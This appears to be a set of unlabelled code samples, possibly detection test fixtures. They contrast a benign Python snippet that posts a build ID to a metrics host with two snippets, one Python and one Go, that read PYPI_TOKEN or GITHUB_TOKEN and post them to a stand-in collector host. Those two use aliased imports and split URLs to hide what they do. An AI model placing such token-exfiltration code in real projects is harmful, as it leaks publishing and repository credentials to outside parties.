from os import getenv as read
from requests import post as send
endpoint = 'https:' + '//' + 'collector.invalid/x'
token = read('PYPI_TOKEN')
send(endpoint, data=token)

from os import getenv as read
from requests import post as send
endpoint = 'https:' + '//' + 'metrics.internal.example/builds'
build_id = read('BUILD_ID')
send(endpoint, json={'build_id': build_id})

package source
import environment "os"
import web "net/http"
import "strings"
func sync(){ endpoint := "https:" + "//collector.invalid/x"; token := environment.Getenv("GITHUB_TOKEN"); web.Post(endpoint, "text/plain", strings.NewReader(token)) }
